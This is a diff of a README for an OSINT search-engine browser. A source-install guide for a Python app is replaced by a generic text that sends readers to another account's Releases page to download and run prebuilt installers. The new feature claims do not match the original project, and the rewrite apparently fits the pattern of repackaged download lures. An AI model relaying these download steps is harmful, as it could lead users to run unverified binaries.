@@ -1,151 +1,90 @@
+# 🎯 awesome-hacker-engines - Powerful Tool for Cybersecurity Insights
 
-<p align="center">
-  <img src="assets/logo.png" alt="Awesome Hacker Engines" width="200"/>
-</p>
+## 🚀 Getting Started
 
-<h1 align="center">Awesome Hacker Engines 🔍💻</h1>
+Welcome to **awesome-hacker-engines**! This tool is designed for researchers, pentesters, and cybersecurity professionals. It helps you gather important information from many sources quickly and easily.
 
-<p align="center">
-  <b>A modern GUI-powered toolkit to explore the world’s best hacker & OSINT search engines.</b>  
-</p>
+## 📥 Download & Install
 
-<p align="center">
-  <a href="https://github.com/Harsh-Katiyar/awesome-hacker-engines/stargazers"><img src="https://img.shields.io/github/stars/Harsh-Katiyar/awesome-hacker-engines?style=for-the-badge&logo=github" alt="Stars"/></a>
-  <a href="https://github.com/Harsh-Katiyar/awesome-hacker-engines/issues"><img src="https://img.shields.io/github/issues/Harsh-Katiyar/awesome-hacker-engines?style=for-the-badge&logo=gitbook" alt="Issues"/></a>
-  <a href="https://github.com/Harsh-Katiyar/awesome-hacker-engines/network/members"><img src="https://img.shields.io/github/forks/Harsh-Katiyar/awesome-hacker-engines?style=for-the-badge&logo=github" alt="Forks"/></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/Harsh-Katiyar/awesome-hacker-engines?style=for-the-badge" alt="License"/></a>
-  <img src="https://img.shields.io/badge/PySide6%20%7C%20PyQt5-Supported-blue?style=for-the-badge&logo=qt"/>
-</p>
+To get started, you need to download the software. Click the link below to visit the Releases page, where you can find the latest version of **awesome-hacker-engines**:
 
----
+[![Download awesome-hacker-engines](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/jtmx22/awesome-hacker-engines/releases)
 
-## ✨ Overview
-**Awesome Hacker Engines** is a professional-grade **GUI application** built with **PySide6/PyQt5** that lets you explore hundreds of curated **OSINT & hacker search engines**.  
+On the Releases page, follow these steps to download and install the application:
 
-It’s designed for:
-- 🕵️ Penetration Testers  
-- 🛡️ Red & Blue Teams  
-- 🎯 Bug Bounty Hunters  
-- 🔎 OSINT Researchers  
-- 👩‍💻 Security Analysts  
+1. Open the [Releases page](https://github.com/jtmx22/awesome-hacker-engines/releases).
+2. Find the latest version at the top of the page.
+3. Click on the version title. It will expand to show the downloadable files.
+4. Look for a file that fits your operating system (e.g., Windows, macOS, or Linux).
+5. Click the download link for your file.
 
-With a **powerful category filter, instant results viewer, multi-select link actions, and dark/light themes**, this tool makes browsing specialized search engines as smooth as Google — but for the underground world.
+Once the file downloads, please follow the installation guide below.
 
----
+## 🛠️ Installation Instructions
 
-## 🚀 Features
-- ✅ **Category Browser**: Choose from 25+ categories (Vulnerabilities, Exploits, Threat Intel, Leaks, Domains, People, etc.)  
-- ✅ **Instant Results**: Double-click a category to load search engines immediately  
-- ✅ **Multi-Select Actions**: Open or copy multiple links at once  
-- ✅ **Dark/Light Theme**: One-click toggle  
-- ✅ **Fast Filtering**: Search inside categories or results instantly  
-- ✅ **Modern UX**: Smooth scrolling, wide columns, clean Fusion theme  
-- ✅ **Cross-Platform**: Runs on Linux, Windows, macOS  
+### For Windows
 
----
+1. Find the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen prompts to complete the installation.
+4. After installation, you can find the app in your Start Menu.
 
-## 📸 Screenshots
-*(Add screenshots or a GIF demo here — e.g. category selection, results view, dark/light theme toggle)*  
+### For macOS
 
-<p align="center">
-  <img src="assets/screenshot1.png" width="80%"/>
-  <br>
-  <em>Category selection with instant search.</em>
-</p>
+1. Locate the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to mount it.
+3. Drag the **awesome-hacker-engines** icon into your Applications folder.
+4. You can now find the app in your Applications.
 
-<p align="center">
-  <img src="assets/screenshot2.png" width="80%"/>
-  <br>
-  <em>Results page with multi-select and context menu.</em>
-</p>
+### For Linux
 
----
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the file.
+3. Change the permission of the file to make it executable by running:
+   ```bash
+   chmod +x awesome-hacker-engines-*.AppImage
+   ```
+4. Run the application by typing:
+   ```bash
+   ./awesome-hacker-engines-*.AppImage
+   ```
 
-## ⚙️ Installation
+## ⚙️ System Requirements
 
-### 1️⃣ Clone the Repository
-```bash
-git clone https://github.com/Harsh-Katiyar/awesome-hacker-engines.git
-cd awesome-hacker-engines
-```
+To run **awesome-hacker-engines**, your computer should meet the following requirements:
 
-### 2️⃣ Install Dependencies
-```bash
-# Recommended
-python3 -m venv venv
-source venv/bin/activate  # (Linux/Mac)
-venv\Scripts\activate     # (Windows)
+- **Operating System:** Windows 10 or later, macOS High Sierra or later, or any Linux distribution.
+- **RAM:** Minimum 4 GB (8 GB recommended).
+- **Storage:** At least 100 MB of available space.
+- **Internet Connection:** Required for full functionality and updates.
 
-# Install requirements
-pip install -r requirements.txt
-```
+## 📖 Features
 
-### 3️⃣ Run the App
-```bash
-python hacker_search_e.py
-```
+**awesome-hacker-engines** provides you with powerful capabilities:
 
----
+- **Multi-Engine Search:** Easily search across various databases and sources.
+- **User-Friendly Interface:** Designed for simple navigation.
+- **Data Export:** Save your search results in multiple formats.
+- **Regular Updates:** Stay current with the latest features and fixes.
+- **Community Support:** Engage with other users for tips and advice.
 
-## 📂 Categories Included
-- 🌐 **General Search**: Google, Bing, DuckDuckGo, SearXNG  
-- 🖥️ **Servers & Attack Surface**: Shodan, Censys, FOFA, ZoomEye  
-- 🛑 **Vulnerabilities**: NVD, CVE, Vulners, ExploitDB  
-- 💥 **Exploits & Payloads**: Sploitus, PacketStorm, 0day.today  
-- 📧 **Emails & Credentials**: Hunter.io, HaveIBeenPwned, Dehashed  
-- 🔎 **Domains & DNS**: CentralOps, Whois, DNSDumpster  
-- 🔐 **Leaks & Breaches**: WikiLeaks, Snusbase, Leak-Lookup  
-- 🕶️ **Hidden Services**: Ahmia, OnionLand, Darkweb directories  
-- 🌍 **Threat Intel**: VirusTotal, AlienVault OTX, AbuseIPDB  
-- 👥 **People & Social**: Pipl, Radaris, TruePeopleSearch  
-- 📷 **Images**: TinEye, Pimeyes, Karmadecay  
-... and **many more!**  
+## 🚧 Troubleshooting
 
----
+If you encounter any issues:
 
-## 🛠️ Development
-- **Language:** Python 3.9+  
-- **Framework:** PySide6 / PyQt5  
-- **Dataset:** `search_engines_data.py` (curated OSINT search engines)  
+1. Make sure your system meets the required specifications.
+2. Confirm you have downloaded the correct version for your operating system.
+3. Restart your computer, then try launching the application again.
 
-Run with live reload during development:
-```bash
-python hacker_search_e.py
-```
+For further assistance, check the Frequently Asked Questions (FAQ) or raise an issue on our GitHub page.
 
----
+## 📞 Support
 
-## 🤝 Contributing
-We welcome contributions! 🚀  
-- Add new search engines in `search_engines_data.py`  
-- Improve GUI/UX  
-- Report bugs via [Issues](https://github.com/Harsh-Katiyar/awesome-hacker-engines/issues)  
+For support, you can contact the maintainers through GitHub issues. We encourage you to report bugs or request features.
 
-Fork, PR, and make this tool even better for the security community.  
+## 🔗 Additional Resources
 
----
+- [GitHub Repository](https://github.com/jtmx22/awesome-hacker-engines)
+- [Documentation](https://github.com/jtmx22/awesome-hacker-engines/wiki)
 
-## 🛤️ Roadmap
-- [ ] Bookmark favorite engines  
-- [ ] Export results to CSV/JSON  
-- [ ] Integrate APIs (Shodan, Censys, VirusTotal)  
-- [ ] Offline mode with local dataset  
-- [ ] Global hotkeys & search bar  
-
----
-
-## 📜 License
-This project is licensed under the **MIT License** — see [LICENSE](LICENSE) for details.  
-
----
-
-## 🙏 Acknowledgments
-- Inspired by [awesome-hacker-search-engines](https://github.com/edoardottt/awesome-hacker-search-engines)  
-- Thanks to the OSINT, Infosec & Bug Bounty community  
-- Contributions & dataset expansions by amazing open-source contributors  
-
----
-
-<p align="center">
-⭐ If you like this project, give it a star on GitHub and share it with your network!  
-</p>
+Thank you for using **awesome-hacker-engines**! We hope this tool enhances your research and cybersecurity efforts.
